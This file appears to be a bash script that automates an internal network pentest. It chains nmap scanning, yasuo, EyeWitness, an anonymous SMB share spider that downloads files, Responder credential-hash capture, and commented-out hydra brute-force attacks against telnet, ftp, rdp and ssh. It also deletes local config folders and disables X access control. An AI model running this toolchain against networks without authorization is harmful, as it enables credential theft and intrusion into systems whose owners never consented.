#!/bin/bash

#if [[ $# -ne 3 ]] ; then
#    echo "Usage: $0 <IP list> <Company Name> <Company website>"
#    exit 0
#fi

xhost +

rm -r .cache/ .config/ .gnome2* .mozilla/ .python-eggs/ .recon-ng/ .zenmap/ Desktop/ hydra.restore includes/yasuo/*.log
clear

if [[ $# -ne 2 ]] ; then
    echo -e "Usage: $0 <IP list> <network interface>\n"
    echo "<ip list>           = File containing IPs or CIDR ranges: one per line."
    echo "<network interface> = eth0, wlan0, etc. thatis connected to the network you wish to scan."
    exit 0
fi


HOME=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
DUMP_LOCATION='scan_results'
NETWORK=$1
INTERFACE=$2
SCAN_RESULTS_LOCATION="$HOME/$DUMP_LOCATION/$NETWORK"

rm -r $SCAN_RESULTS_LOCATION

if [ ! -d $SCAN_RESULTS_LOCATION ]; then
	mkdir -p $SCAN_RESULTS_LOCATION;
fi

#Port Scanning
nmap -iL $HOME/$NETWORK -n -sT -sV -oA $SCAN_RESULTS_LOCATION/$NETWORK -vv -T4 -sC --open -Pn --top-ports=5000

#Create HTML of Nmap Scan Results
xsltproc $SCAN_RESULTS_LOCATION/$NETWORK.xml -o $SCAN_RESULTS_LOCATION/$NETWORK.html

#Parse Nmap results for PeepingTom and service brute forcing
echo 'y' | $HOME/includes/gnmapparser.sh -g $SCAN_RESULTS_LOCATION/
mv $HOME/Parsed-Results/ $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/

#Parse Nmap for report table on Nmap results
python $HOME/includes/parse_nmap.py -f $SCAN_RESULTS_LOCATION/$NETWORK.xml

# Yasuo scan
cd includes/yasuo/
./yasuo.rb -f $SCAN_RESULTS_LOCATION/$NETWORK.xml -b all > $SCAN_RESULTS_LOCATION/yasuo.txt
cd $HOME

# USE EYE WITNESS HERE.. screesnhot web + vnc + rdp
#./EyeWitness.py -f $SCAN_RESULTS_LOCATION/$NETWORK.xml --all-protocols -d $SCAN_RESULTS_LOCATION/EyeWhitness --no-prompt
### HAck until EyeWitness can parse XML correctly.
cat $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Third-Party/PeepingTom.txt > /tmp/EW-hack.txt
cat $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Matrix/TCP-Services-Matrix.csv | sed 's/,TCP,/:/' >> /tmp/EW-hack.txt
$HOME/includes/EyeWitness/EyeWitness.py -f /tmp/EW-hack.txt --web --rdp -d $SCAN_RESULTS_LOCATION/EyeWhitness --no-prompt
### End hack

rm *.gnmap

#Clean
mkdir $SCAN_RESULTS_LOCATION/nmap_results
mv $SCAN_RESULTS_LOCATION/$NETWORK.{gnmap,nmap,xls,xml,html} $SCAN_RESULTS_LOCATION/nmap_results/
cp $HOME/$NETWORK $SCAN_RESULTS_LOCATION/
rm -r $HOME/Desktop

#SMB Spider
smbtree -N > /tmp/shares
cat /tmp/shares | grep -P "\t\t\\\\" | cut -d$'\t' -f3 | cut -d '\' -f4  | sed 's/ +//' | sort -u > /tmp/shares2
mv /tmp/shares2 /tmp/shares
cat $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/139-TCP.txt $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/445-TCP.txt | sort -u > /tmp/smb
includes/smbspider.py -h /tmp/smb -u anonymous -p anonymous -f /tmp/shares -g includes/smb_autodownload.txt -w
mkdir -p $SCAN_RESULTS_LOCATION/smb
mv smb* $SCAN_RESULTS_LOCATION/smb/

#Open results in IceWeasel
iceweasel &
sleep 3
iceweasel -new-tab $SCAN_RESULTS_LOCATION/yasuo.txt &
sleep 1
iceweasel -new-tab $SCAN_RESULTS_LOCATION/smb/ &
sleep 1
iceweasel -new-tab $SCAN_RESULTS_LOCATION/EyeWhitness &
sleep 1
iceweasel -new-tab $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.html &
sleep 1

#Open Zenmap
zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml & 

#Run Responder
cd includes/Responder/
python ./Responder.py -I $INTERFACE -b Off -r Off -w On
mkdir -p $SCAN_RESULTS_LOCATION/Responder_data
cd logs
for FILENAME in *; do mv $FILENAME $FILENAME.txt; done 
mv * $SCAN_RESULTS_LOCATION/Responder_data/
iceweasel -new-tab $SCAN_RESULTS_LOCATION/Responder_data/ &
sleep 1

cd $HOME
#Brute Force attacks
#mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t4 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t4 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t2 -W16 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t4 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt

#iceweasel -new-tab $SCAN_RESULTS_LOCATION/bruteforced_creds/ &
sleep 1


